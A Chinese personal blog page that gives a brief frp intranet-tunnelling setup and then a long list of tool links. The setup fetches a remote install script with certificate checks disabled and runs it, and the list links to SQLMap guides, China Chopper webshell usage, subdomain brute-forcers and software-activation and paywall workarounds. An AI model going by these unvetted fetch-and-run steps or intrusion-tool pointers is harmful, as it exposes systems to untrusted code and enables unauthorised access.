<h3 id="十分钟快速搭建内网穿透工具-frp"><a href="#十分钟快速搭建内网穿透工具-frp" class="headerlink" title="十分钟快速搭建内网穿透工具 frp"></a>十分钟快速搭建内网穿透工具 frp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp，udp，http，https，stcp 协议。</span><br><span class="line">frp 需要服务端和客户端共同作用，服务端为 frps，一般安装在 vps 服务器上；客户端为 frpc，一般安装在路由器或 NAS 上。</span><br><span class="line">frps 和 frpc 配置使用，可以远程访问或控制内网设备</span><br><span class="line">https:<span class="comment">//github.com/clangcn/onekey-install-shell/tree/master/frps </span></span><br><span class="line">$ wget --no-check-certificate https:<span class="comment">//raw.githubusercontent.com/clangcn/onekey-install-shell/master/frps/install-frps.sh -O ./install-frps.sh</span></span><br><span class="line">$ chmod <span class="number">700</span> ./install-frps.sh</span><br><span class="line">$ ./install-frps.sh install</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">https:<span class="comment">//github.com/fatedier/frp/releases</span></span><br><span class="line">修改 frpc.ini 文件</span><br><span class="line">[common]</span><br><span class="line">server_addr = xxxxxx    # 服务器 IP</span><br><span class="line">server_port = 5443      # bind_port</span><br><span class="line">token = xxxxxx          # 与服务器一致</span><br><span class="line"></span><br><span class="line">[test]</span><br><span class="line">type = http             # 类型</span><br><span class="line">local_ip = 127.0.0.1    # 本地 IP</span><br><span class="line">local_port = 80         # 本地端口</span><br><span class="line">use_encryption = true   # 传输加密</span><br><span class="line">use_gzip = true         # gzip 压缩</span><br><span class="line">custom_domains = xxxxxx # 自定义域名</span><br><span class="line">http_user = xxxxxx      # 可选，访问账号</span><br><span class="line">http_pwd = xxxxxx       # 可选，访问密码</span><br><span class="line">打开 cmd，运行 frpc.exe 即可</span><br><span class="line"><span class="number">80</span> 端口被 Nginx 占用的情况下，利用 Nginx 进行端口转发</span><br><span class="line">server</span><br><span class="line">    &#123;</span><br><span class="line">        listen <span class="number">80</span>;</span><br><span class="line">        server_name www.cnguu.cn;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http:<span class="comment">//127.0.0.1:7080;</span></span><br><span class="line">            proxy_redirect off;</span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">        &#125;</span><br><span class="line">        access_log off;</span><br><span class="line">        error_log /dev/<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    https:<span class="comment">//gleehub.com/tool/shi-fen-zhong-kuai-su-da-jian-nei-wang-chuan-tou-gong-ju------frp.html</span></span><br></pre></td></tr></table></figure>
<p>安利一个在线音频剪辑网站。适合应急与轻量的编辑。网址：<a href="https://mp3cut.net/cn/" target="_blank" rel="noopener">https://mp3cut.net/cn/</a> </p>
<p>推荐一个超厉害的在线朗读网站，这个网站包括了粤语、英语、法语、德语、日语、韩语、意大利语、西班牙语、葡萄牙语等语种，还可以选择朗读倍速，再不用怕汉语里夹带外语的作品了 。传送门：<a href="https://www.entts.com/" target="_blank" rel="noopener">https://www.entts.com/</a> </p>
<p>文件快传网站及源码 <a href="http://blog.zgcwkj.cn/archives/866.html#comment-420" target="_blank" rel="noopener">http://blog.zgcwkj.cn/archives/866.html#comment-420</a><br>咸鱼导航 <a href="https://xfisher.com/fish" target="_blank" rel="noopener">https://xfisher.com/fish</a><br>12306 抢票助手<a href="https://github.com/pjialin/py12306" target="_blank" rel="noopener">https://github.com/pjialin/py12306</a><br>永久免费在线抢票软件 <a href="https://www.12306bycloud.com/index" target="_blank" rel="noopener">https://www.12306bycloud.com/index</a><br>免费ssr <a href="https://www.attackmen.com/" target="_blank" rel="noopener">https://www.attackmen.com/</a>  <a href="https://nine-fox.com/editor/#/keysetViewer" target="_blank" rel="noopener">https://nine-fox.com/editor/#/keysetViewer</a><br>google <a href="https://gamedun.github.io/" target="_blank" rel="noopener">https://gamedun.github.io/</a><br>用于统计某个username的github贡献信息<a href="https://github.com/hustclf/that_is_me_on_github" target="_blank" rel="noopener">https://github.com/hustclf/that_is_me_on_github</a><br>命令行就可以把网页保存成 PDF 文件 <a href="https://github.com/danburzo/percollate" target="_blank" rel="noopener">https://github.com/danburzo/percollate</a><br>gitbatch：一站式 git 管理命令行界面工具<a href="https://github.com/isacikgoz/gitbatch" target="_blank" rel="noopener">https://github.com/isacikgoz/gitbatch</a><br>Githistory 这个工具真的超级赞，替换一下URL即可看到所有提交记录 <a href="https://githistory.xyz/" target="_blank" rel="noopener">https://githistory.xyz/</a><br>将 github 上的文件地址 通过来访问 <a href="http://raw.githack.com/" target="_blank" rel="noopener">http://raw.githack.com/</a> <a href="http://htmlpreview.github.com/" target="_blank" rel="noopener">http://htmlpreview.github.com/</a> 将文件地址填入即可生成 url<br>做了个chrome插件Picee，能够把 Github 仓库作为图床应用，支持通过粘贴、拖拽、选择的方式选择图片，并能一键复制图片外链，欢迎使用~~ <a href="https://github.com/jrainlau/picee" target="_blank" rel="noopener">https://github.com/jrainlau/picee</a><br><a href="https://www.extractpdf.com/一个可以将" target="_blank" rel="noopener">https://www.extractpdf.com/一个可以将</a> pdf 中的图片全部提取出来并打包下载的一个工具，还可以看到文档中纯文字部分<br>一个能完美的将网页导出到PDF的在线服务，可使用其提供的API，在你的在线简历页面添加一个PDF导出按钮。地址<a href="https://www.sejda.com/html-to-pdf" target="_blank" rel="noopener">https://www.sejda.com/html-to-pdf</a><br>不会安装扩展定制版Chrome浏览器下载安装地址，请直接到奔跑中的奶酪大佬的博客上去直接下载：<a href="https://www.runningcheese.com/chrome" target="_blank" rel="noopener">https://www.runningcheese.com/chrome</a><br>网易见外】为视频自动生成字幕、音频转文字等等，好用极了，哭着推荐！<br>地址<a href="https://jianwai.netease.com/" target="_blank" rel="noopener">https://jianwai.netease.com/</a><br>证件照一键抠图换背景v2 <a href="https://www.lanzous.com/i554s8f" target="_blank" rel="noopener">https://www.lanzous.com/i554s8f</a><br>微信读书组队抽奖 <a href="https://weread.qnmlgb.tech/" target="_blank" rel="noopener">https://weread.qnmlgb.tech/</a> 既可以快速组队抽奖又不用分享群或者朋友圈。<br>主要功能是对整个文档进行翻译，100多种不同语言文档可任意转换，无需注册<a href="https://www.onlinedoctranslator.com/" target="_blank" rel="noopener">https://www.onlinedoctranslator.com/</a><br>撘楼分享个摸鱼网站： <a href="https://tophub.fun" target="_blank" rel="noopener">https://tophub.fun</a>  全平台支持 <a href="https://www.printf520.com/hot.html" target="_blank" rel="noopener">https://www.printf520.com/hot.html</a><br><a href="https://whereisscihub.now.sh/" target="_blank" rel="noopener">https://whereisscihub.now.sh/</a>  Sci.hub是一个开源学术数据库，在上面免费提供了超过62,000,000篇科学论文和文章，并且每天会上传新的论文文章<br>正则闯关的网站 <a href="https://alf.nu/RegexGolf" target="_blank" rel="noopener">https://alf.nu/RegexGolf</a><br>录制浏览器交互并生成测试脚本的测试工具 <a href="https://github.com/prprprus/softest" target="_blank" rel="noopener">https://github.com/prprprus/softest</a><br>简单易用的文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志<a href="https://github.com/ayuliao/Autopublish" target="_blank" rel="noopener">https://github.com/ayuliao/Autopublish</a><br><a href="https://github.com/tophubs/TopList" target="_blank" rel="noopener">https://github.com/tophubs/TopList</a> 摸鱼神器<br>一键安装 v2ray 脚本 <a href="https://github.com/233boy/v2ray" target="_blank" rel="noopener">https://github.com/233boy/v2ray</a><br>ip地址在线计算器 <a href="http://www.ab126.com/goju/1840.html" target="_blank" rel="noopener">http://www.ab126.com/goju/1840.html</a><br> LeetCode 的题目印成一本书使用这个小工具： <a href="https://github.com/Sneezry/leetpress" target="_blank" rel="noopener">https://github.com/Sneezry/leetpress</a><br>抖音推荐列表视频爬虫 <a href="https://github.com/cnbattle/douyin" target="_blank" rel="noopener">https://github.com/cnbattle/douyin</a><br>H5 实时语音通话聊天玩具 <a href="https://xiangyuecn.github.io/Recorder/" target="_blank" rel="noopener">https://xiangyuecn.github.io/Recorder/</a><br>Postwoman 是一款开源的 Postman 替代品 <a href="https://liyasthomas.github.io/postwoman/" target="_blank" rel="noopener">https://liyasthomas.github.io/postwoman/</a> <a href="https://zhaodao.ai/p/10657" target="_blank" rel="noopener">https://zhaodao.ai/p/10657</a><br><a href="https://zhaodao.ai/p/10630" target="_blank" rel="noopener">https://zhaodao.ai/p/10630</a> 寻求电影推荐 小程序 找到ai<br>linerider：一个小游戏，用笔画出一条线，小人就沿着线滑雪撬，可以翻跟头可以下滑可以倒退，N种不同的结果全在你的掌握~如果你画出一个满意的线路，还可以保存成视频~在线试玩：<a href="https://www.linerider.com/" target="_blank" rel="noopener">https://www.linerider.com/</a><br>刚看到的，一个免费在线录屏工具，可以自由录制电脑屏幕中的画面，高清无广告，完全免费，支持多平台，还可以进行简单的编辑。<br>推荐一个好用的录屏工具，录制没有时长限制，录的时候还可以添加文字等标注。完全免费。 应用链接：<a href="https://showmore.com/zh/" target="_blank" rel="noopener">https://showmore.com/zh/</a><br>mangaEditor  一个在线漫画自动翻译工具，不用安装，支持ORC+翻译，可以还能自动涂白 <a href="https://moeka.me/mangaEditor/" target="_blank" rel="noopener">https://moeka.me/mangaEditor/</a> </p>
<p>Make Girls Moe：一个基于 GAN 自动生成二次元妹子，项目由复旦大学，同济大学和纽约州立大学石溪分校的一些研究爱好者开发，在线生成头像：<a href="https://make.girls.moe/#/" target="_blank" rel="noopener">https://make.girls.moe/#/</a><br>团队开发的效率工具 uTools，模块化定制开发工具，目前有编码小助手，图床，内网穿透，翻译，应用网页快开，OCR，取色，TODO等小插件，使用electron开发。官网地址：<a href="https://u.tools" target="_blank" rel="noopener">https://u.tools</a><br>demo.glyptodon.com <a href="https://demo.glyptodon.com/#/client/ZGVtbwBjAGRlbW8=demo.glyptodon.com" target="_blank" rel="noopener">https://demo.glyptodon.com/#/client/ZGVtbwBjAGRlbW8=demo.glyptodon.com</a> ：一个网站，打开后可以临时生成一个 Windows 系统，免费使用 15 分钟，网速快并且可以访问 Google/Youtube 等网站，<br>网页错别字检测：一个 AI 网页错别字检测工具，自动提取出网页上的文字，查找出错别字，然后标识出来 <a href="https://chrome.google.com/webstore/detail/%E7%BD%91%E9%A1%B5%E9%94%99%E5%88%AB%E5%AD%97%E6%A3%80%E6%B5%8B/dadfipibjfkfgfibaiiedoedjogaekcd?hl=zh-CN" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/%E7%BD%91%E9%A1%B5%E9%94%99%E5%88%AB%E5%AD%97%E6%A3%80%E6%B5%8B/dadfipibjfkfgfibaiiedoedjogaekcd?hl=zh-CN</a><br>工程和科学方程的求解器。 ​​​​<a href="https://www.fxsolver.com/" target="_blank" rel="noopener">https://www.fxsolver.com/</a><br>一键改图是一个超简单的在线图片处理工具网站，已完美实现：图片尺寸压缩、图片质量压缩、图片缩略图生成、图片添加水印、图片裁剪、图片生成内切圆、图片生成圆角、图片格式转换、图片打码马赛克、图片旋转、图片锐化、图片模糊、图片调整亮度、图片调整对比度、图片 exif 信息获取等强大功能。<a href="https://yijiangaitu.com/" target="_blank" rel="noopener">https://yijiangaitu.com/</a><br>安利一个有些沙雕的绘画生成 gif 的网站：<a href="https://brush.ninja/brush.ninja，除了自己绘画，还支持用多张图片合成" target="_blank" rel="noopener">https://brush.ninja/brush.ninja，除了自己绘画，还支持用多张图片合成</a> GIF<br>Typingclub 是一个免费在线指法练习网站。点击 Get Started ，即可开始练习。所有练习一共包含 32 个级别，684 个练习。从第 8 个级别开始，就开始进入解锁通关模式。地址：<a href="https://www.typingclub.com/typingclub.com" target="_blank" rel="noopener">https://www.typingclub.com/typingclub.com</a><br>Github 发布了一个可以 DIY 自己章鱼猫的工具<a href="https://myoctocat.com/build-your-octocat/" target="_blank" rel="noopener">https://myoctocat.com/build-your-octocat/</a><br>Codeshare.io在浏览器中实时共享写代码的工具。免费、不需要注册（保留24小时）、支持音视频、支持多种语言的语法高亮。<br>Aria2 – 超・懒人包：只需 2 步就能使用神器 aria2 下载文件了。<a href="https://meta.appinn.net/t/aria2-2018-11-19/7434" target="_blank" rel="noopener">https://meta.appinn.net/t/aria2-2018-11-19/7434</a> <a href="https://u15690961.pipipan.com/fs/15690961-316288741" target="_blank" rel="noopener">https://u15690961.pipipan.com/fs/15690961-316288741</a><br>推荐一个超厉害的在线朗读网站，这个网站包括了粤语、英语、法语、德语、日语、韩语、意大利语、西班牙语、葡萄牙语等语种，还可以选择朗读倍速，再不用怕汉语里夹带外语的作品了 。传送门：<a href="https://www.entts.com/" target="_blank" rel="noopener">https://www.entts.com/</a> </p>
<p>一个以文本方式录制终端内容的工具，看起来挺炫的。<a href="https://asciinema.org/" target="_blank" rel="noopener">https://asciinema.org/</a><br>可以一键自动排版至微信公众号、知乎专栏、微博头条、简书、头条号、企鹅号。<a href="https://www.mkeditor.com/" target="_blank" rel="noopener">https://www.mkeditor.com/</a><br>在线 timeline 生成器 <a href="https://time.graphics/" target="_blank" rel="noopener">https://time.graphics/</a><br>安利一个在线音频剪辑网站。适合应急与轻量的编辑。网址：<a href="https://mp3cut.net/cn/" target="_blank" rel="noopener">https://mp3cut.net/cn/</a><br>√ 全程免费无广告<br>√ 拥有简体中文界面<br>√ 支持Google Drive 、 Dropbox、URL链接和本地上传四种方式<br>√ 可导出为 iPhone 铃声<br>√ 编辑界面有声波图预览<br>√ 支持 300 多种文件格式<br>githubtimeline：偷窥时间线，你可以看到任意一个 GitHub 用户的行为活动轨迹。在线体验：<a href="https://githubtimeline.xyz/" target="_blank" rel="noopener">https://githubtimeline.xyz/</a><br>sourcerer：可视化你的Github贡献，甚至分析出你在什么时候参与开源更活跃。在线体验地址：<a href="https://sourcerer.io/" target="_blank" rel="noopener">https://sourcerer.io/</a><br>aconvert：一个免费的在线格式转换工具，支持文档、文档、pdf、图片、视频和音频，最赞的一点是可以直接复制原内容链接进行转换，免去下载上传的麻烦，对于视频转 GIF 非常友好<a href="https://www.aconvert.com/cn/video/mp4-to-gif/" target="_blank" rel="noopener">https://www.aconvert.com/cn/video/mp4-to-gif/</a><br>文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志 <a href="https://github.com/ayuliao/Autopublish" target="_blank" rel="noopener">https://github.com/ayuliao/Autopublish</a><br>蚂蚁森林能量智能收取脚本 (基于Auto.js)<a href="https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest" target="_blank" rel="noopener">https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest</a></p>
<p>perma.cc 是一个很好的第三方网页永久保留平台，perma可以将网页永久保存下来成为一个档案馆，帮助你保留网页证据以便日后使用</p>
<p>阿虚同学的储物间 <a href="http://kyon945.ys168.com/" target="_blank" rel="noopener">http://kyon945.ys168.com/</a> <a href="https://axutongxue.github.io/" target="_blank" rel="noopener">https://axutongxue.github.io/</a></p>
<p>仿站小工具 <a href="https://smalltool.github.io/2019/07/29/xft3.0/" target="_blank" rel="noopener">https://smalltool.github.io/2019/07/29/xft3.0/</a><br> Gogs 是一个简单、最快速和最轻松的方式搭建自助 Git 服务。<br>工具集SCI-Hub科研论文网址<a href="http://tool.yovisun.com/scihub/" target="_blank" rel="noopener">http://tool.yovisun.com/scihub/</a><br>Gogs 可以在5分钟搭建一个和github差不多的网站。 <a href="https://www.jpeg.io/" target="_blank" rel="noopener">https://www.jpeg.io/</a><br>时光机器<a href="https://web.archive.org/" target="_blank" rel="noopener">https://web.archive.org/</a><br>在线分解质因子<a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a><br>工具 <a href="https://htmlpreview.github.io/?https://raw.githubusercontent.com/v2ray/v2ray.github.io/master/awesome/tools.html" target="_blank" rel="noopener">https://htmlpreview.github.io/?https://raw.githubusercontent.com/v2ray/v2ray.github.io/master/awesome/tools.html</a><br> 微博监督员批量拉黑工具<a href="https://tiansh.github.io/us-weibo/Weibo_Supervisor_Blacklist_Tool/" target="_blank" rel="noopener">https://tiansh.github.io/us-weibo/Weibo_Supervisor_Blacklist_Tool/</a> <a href="https://github.com/yu961549745/WeiboBlackList" target="_blank" rel="noopener">https://github.com/yu961549745/WeiboBlackList</a><br>ctf工具 <a href="https://csuwangj.github.io/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/" target="_blank" rel="noopener">https://csuwangj.github.io/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/</a><br>somd5 md5online.com<br>中国菜刀之类菜刀工具的使用<a href="https://fly8wo.github.io/2018/08/24/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B9%8B%E7%B1%BB%E8%8F%9C%E5%88%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">https://fly8wo.github.io/2018/08/24/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B9%8B%E7%B1%BB%E8%8F%9C%E5%88%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</a><br>site:github.io 工具<br>github上的工具集合子域名枚举扫描器或爆破工具<a href="https://only-free.github.io/2018/12/24/gayhub-shang-de-gong-ju-ji-he/" target="_blank" rel="noopener">https://only-free.github.io/2018/12/24/gayhub-shang-de-gong-ju-ji-he/</a><br>新媒体工具箱<a href="https://bpteach.github.io/New-Media-Toolbox/" target="_blank" rel="noopener">https://bpteach.github.io/New-Media-Toolbox/</a><br>谷歌助手<a href="https://github.com/haotian-wang/google-access-helper/releases" target="_blank" rel="noopener">https://github.com/haotian-wang/google-access-helper/releases</a> <a href="https://axutongxue.github.io/2019/08/12/%E6%97%A0%E8%AE%BA%E5%A4%9A%E5%B0%91%E6%AC%A1%EF%BC%8C%E6%88%91%E9%83%BD%E6%8E%A8%E8%8D%90%E4%BD%A0%E7%94%A8%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2/" target="_blank" rel="noopener">https://axutongxue.github.io/2019/08/12/%E6%97%A0%E8%AE%BA%E5%A4%9A%E5%B0%91%E6%AC%A1%EF%BC%8C%E6%88%91%E9%83%BD%E6%8E%A8%E8%8D%90%E4%BD%A0%E7%94%A8%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2/</a><br><a href="https://zjcqoo.github.io/" target="_blank" rel="noopener">https://zjcqoo.github.io/</a> <a href="https://github.com/EtherDream/jsproxy" target="_blank" rel="noopener">https://github.com/EtherDream/jsproxy</a><br>文字转语音<a href="https://developer.baidu.com/vcast" target="_blank" rel="noopener">https://developer.baidu.com/vcast</a><br>阿虚同学的储物间 <a href="http://kyon945.ys168.com/" target="_blank" rel="noopener">http://kyon945.ys168.com/</a> <a href="https://axutongxue.github.io/" target="_blank" rel="noopener">https://axutongxue.github.io/</a><br>万能君的小工具 <a href="https://www.52pojie.cn/thread-981080-1-1" target="_blank" rel="noopener">https://www.52pojie.cn/thread-981080-1-1</a>.<br>个人学习手册（AI、Web、Quant） <a href="https://github.com/zmecust/learning-manual" target="_blank" rel="noopener">https://github.com/zmecust/learning-manual</a><br>LNMP一键安装程序<a href="https://github.com/yeszao/dnmp" target="_blank" rel="noopener">https://github.com/yeszao/dnmp</a> <a href="https://www.awaimai.com/2120.html" target="_blank" rel="noopener">https://www.awaimai.com/2120.html</a><br>win 下集成环境除了 XAMPP 、phpStudy ，现在还有个 laragon 也不错<br>敏感词过滤 <a href="https://github.com/FireLustre/php-dfa-sensitive" target="_blank" rel="noopener">https://github.com/FireLustre/php-dfa-sensitive</a><br>仿知网<a href="https://www.cn-ki.net/仿知网是一个完全可以代替知网的精品网站" target="_blank" rel="noopener">https://www.cn-ki.net/仿知网是一个完全可以代替知网的精品网站</a></p>
<p> 我收集了 3000 多万翻译数据，建立了一个搜索引擎，以后做国际化的就不用重复翻译了。<a href="https://i18ns.com/zh/index.html" target="_blank" rel="noopener">https://i18ns.com/zh/index.html</a><br> canvas图片水印，用于身份证等个人信息添加仅用于XXX等字样保护个人信息<a href="https://github.com/dxcweb/watermark?utm_source=hacpai.com" target="_blank" rel="noopener">https://github.com/dxcweb/watermark?utm_source=hacpai.com</a><br> <a href="http://watermark.dxcweb.com/" target="_blank" rel="noopener">http://watermark.dxcweb.com/</a><br> 下载工具<a href="https://motrix.app/" target="_blank" rel="noopener">https://motrix.app/</a><br> Go 语言常用工具库，这个轱辘还算圆！ <a href="https://github.com/b3log/gulu?utm_source=hacpai.com" target="_blank" rel="noopener">https://github.com/b3log/gulu?utm_source=hacpai.com</a></p>
<p> 词云<a href="https://me.bdp.cn/home.html" target="_blank" rel="noopener">https://me.bdp.cn/home.html</a> <a href="http://www.picdata.cn" target="_blank" rel="noopener">http://www.picdata.cn</a> <a href="http://www.tocloud.com" target="_blank" rel="noopener">http://www.tocloud.com</a> WordArt.com Tagxedo.com WordItOut.com Wordle.net<br>gif 录制工具 · licecap<br><a href="https://hacpai.com/tag/tools" target="_blank" rel="noopener">https://hacpai.com/tag/tools</a><br>这里我就要介绍强大的 LICEcap 了，用来做屏幕截图的，录制出来的 gif 很小，我的所有 gif 都是通过它来制作的。<br><a href="https://www.screentogif.com/?l=zh_cn" target="_blank" rel="noopener">https://www.screentogif.com/?l=zh_cn</a> GifCam 也不错<a href="https://github.com/ShareX/ShareX" target="_blank" rel="noopener">https://github.com/ShareX/ShareX</a><br>github.dev，这是由 Github 官方出品的个人网站生成器工具；它可以快速帮你建立一个展示您的贡献、兴趣和开发经验的个人网站。 它是您自己的完全可自定义的 GitHub 配置文件，由 GitHub API，GitHub Pages 和 Jekyll 提供支持，适用于对您的工作感兴趣的任何人 - 只要您准备好分享它</p>
<p><a href="http://we.woshifyz.com/" target="_blank" rel="noopener">在线协作编辑器一起写</a></p>
<p><a href="https://nicelinks.site/theme/tools" target="_blank" rel="noopener">工具收集</a></p>
<p><a href="https://smalltool.github.io/2019/07/29/xft3.0/" target="_blank" rel="noopener">仿站小工具 </a></p>
<p><a href="https://tiansh.github.io/us-weibo/Weibo_Supervisor_Blacklist_Tool/" target="_blank" rel="noopener">微博监督员批量拉黑工具</a></p>
<p><a href="https://i18ns.com/zh/index.html" target="_blank" rel="noopener">翻译数据</a></p>
<p><a href="http://factordb.com" target="_blank" rel="noopener">在线分解质因子</a></p>
<p><a href="https://www.processon.com/view/link/5d789e4ee4b01cbe9930968a#outline" target="_blank" rel="noopener">在线流程图</a></p>
<p><a href="https://www.cn-ki.net/" target="_blank" rel="noopener">仿知网是一个完全可以代替知网的精品网站</a></p>
<p><a href="https://ocr.godruoyi.com/" target="_blank" rel="noopener">在线ocr</a></p>
<p><a href="https://xinquji.com/" target="_blank" rel="noopener">新趣集 - 一个新的产品发现网站</a></p>
<p><a href="https://smallpdf.com/cn/unlock-pdf" target="_blank" rel="noopener">PDF文件在线解密http://www.free-pdftoword.com/cn/</a></p>
<p><a href="http://www.ibilibili.com/video/av4117003/" target="_blank" rel="noopener">下载 B 站（bilibili）视频新技能  bilibili.com 前面加一个 i 即可 https://www.bilibilijj.com/video/av4117003/</a></p>
<p><a href="https://en.savefrom.net/?rmode=false" target="_blank" rel="noopener">下载YouTube youtube前面加个ss也行 youtubemultidownloader.net www.vidpaw.com</a></p>
<p><a href="https://download-instagram.com/" target="_blank" rel="noopener">免费下载 Instagram 视频图片</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjkwMjYwNA==&amp;mid=100002603&amp;idx=1&amp;sn=179374d0d2235583466dd34175456551&amp;chksm=17bfbc8820c8359e2f4b9d0a50719b3fc8513a80f066aeb43a0fee22b84d4ce16c4db72126e1&amp;scene=18&amp;xtrack=1&amp;key=8a4c04f4ab18b288da9f4ebcc8b0caf3212fa7351dc22124c754e17784c5efbf9bab02312365be8ce3ee1dc61877adc949c37964479369669b566b744cd04ea257483f296fbd99666d9d2748f8398b71&amp;ascene=1&amp;uin=MTI4Njc4MzkwNw%3D%3D&amp;devicetype=Windows+10&amp;version=6206081a&amp;lang=zh_CN&amp;pass_ticket=ocqUuByCJ%2FRWKUuUy%2BSWlr9tCU4%2BkvBVgULxsX2Ox%2BvltZ32XRloRo16y2u672Kz" target="_blank" rel="noopener">软件下载列表</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjkwMjYwNA==&amp;mid=2247487059&amp;idx=1&amp;sn=9c0b7277229c451561aaf9909e0771ee&amp;chksm=97bfb9f0a0c830e6422ca794c7625e45b29b9e8560927234b1afae29e96b3a3e01d5a49b1c4f&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">百度网盘满速下载baiduwp</a></p>
<p><a href="https://dy.kukutool.com/kuaishou?i=7" target="_blank" rel="noopener">抖音相关工具合集-抖音网页版，视频去水印</a></p>
<p><a href="https://liujingyuan.top/2018/09/13/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E8%A7%86%E9%A2%91%E4%B8%8B%E8%BD%BD/" target="_blank" rel="noopener">下载微信公众号的视频</a></p>
<p><a href="https://dy.kukutool.com/douyinweb?i=8" target="_blank" rel="noopener">抖音网页版https://dy.kukutool.com/douyinweb https://welltool.net/rank</a></p>
<p><a href="https://github.com/tomxin7/DouYinFaceTech" target="_blank" rel="noopener">抖音自动识别抖音小姐姐并点赞</a></p>
<p><a href="https://www.chongbuluo.com/thread-5885-1-1.html" target="_blank" rel="noopener">简单一步激活 Office2019</a></p>
<p><a href="https://detail.tmallasd.com/item.htm?spm=a230r.1.14.51.6f844edci6lUUa&amp;id=583060801152&amp;ns=1&amp;abbucket=11" target="_blank" rel="noopener">商品历史价格查询  地址栏中的电商域名后加入字母asd即可查询当前商品历史价格</a></p>
<p><a href="https://wenku.baiduvvv.com" target="_blank" rel="noopener">百度文库文档在线免费导出工具</a></p>
<p><a href="https://www.chongbuluo.com/thread-2242-1-1.html" target="_blank" rel="noopener"> VIP 视频解析免会员观看</a></p>
<p><a href="https://gitbook.cn/books/5ba8393639ea516190a9b8f8/index.html" target="_blank" rel="noopener">SQLMap 从入门到入狱详细指南</a></p>
<p><a href="http://www.vuln.cn/1992" target="_blank" rel="noopener">Sqlmap使用教程</a></p>
<p><a href="http://www.vuln.cn/wooyun_zone" target="_blank" rel="noopener">乌云空间</a></p>
<p><a href="http://google.studypro.club" target="_blank" rel="noopener">google代理</a></p>
<p><a href="https://affinelayer.com/pixsrv/index.html" target="_blank" rel="noopener">在线画图</a></p>
<p><a href="https://paper.seebug.org/" target="_blank" rel="noopener">安全技术精粹</a></p>
<p><a href="https://wenku.baiduvvv.com/view/d87fd9ea19e8b8f67c1cb9fe.html" target="_blank" rel="noopener">百度文库下载工具</a></p>
<p><a href="https://zh.snipaste.com/" target="_blank" rel="noopener">截图</a></p>
<p><a href="https://github.com/NickeManarin/ScreenToGif/" target="_blank" rel="noopener">gif mac http://cockos.com/licecap/</a></p>
<p><a href="https://mp.weixin.qq.com/s/jmHDL8QJfzUueRZHq1Ke-g" target="_blank" rel="noopener">Chrome浏览器都安装了哪些扩展插件</a></p>
<p><a href="https://zhaoolee.github.io/ChromeAppHeroes/" target="_blank" rel="noopener">Chrome插件英雄榜：</a></p>
<p><a href="https://www.njphper.com/posts/e8d8fd18.html" target="_blank" rel="noopener">v2ray 更安全的代理服务</a></p>
<p><a href="https://2zimu.niucodata.com/index" target="_blank" rel="noopener">生成字幕https://greatdk.com/</a></p>
<p><a href="https://blog.smoker.cc/docker/elk-stack-in-docker.html" target="_blank" rel="noopener">ELK Stack 和 Docker 搭建日志平台</a></p>
<p><a href="https://www.screentogif.com/" target="_blank" rel="noopener"> gif 动图很好用 ScreenToGif</a></p>
<p><a href="https://www.banpie.info/shadowsocks-pac-gfw/" target="_blank" rel="noopener">科学上网：使用Shadowsock搭建一条自由的梯子</a></p>
<p><a href="https://juejin.im/post/5ca5c1eb6fb9a05e247af981" target="_blank" rel="noopener">google的outline科学上网</a></p>
<p><a href="https://github.com/loremwalker/WebSiteUseful" target="_blank" rel="noopener">翻墙！冲出你的窗口</a></p>
<p><a href="https://github.com/loremwalker/fq-book" target="_blank" rel="noopener">翻墙！免费科学上网方法与技巧</a></p>
<p><a href="https://finthon.com/google-fan-qiang/" target="_blank" rel="noopener">通过谷歌云（GCP）免费科学上网一年</a></p>
<p><a href="https://haoel.github.io/" target="_blank" rel="noopener">科学上网</a></p>
<p><a href="https://github.com/googlehosts/hosts" target="_blank" rel="noopener">google hosts</a></p>
<p><a href="http://alasql.org/" target="_blank" rel="noopener">JavaScript编写的内存型SQL数据库AlaSQL</a></p>
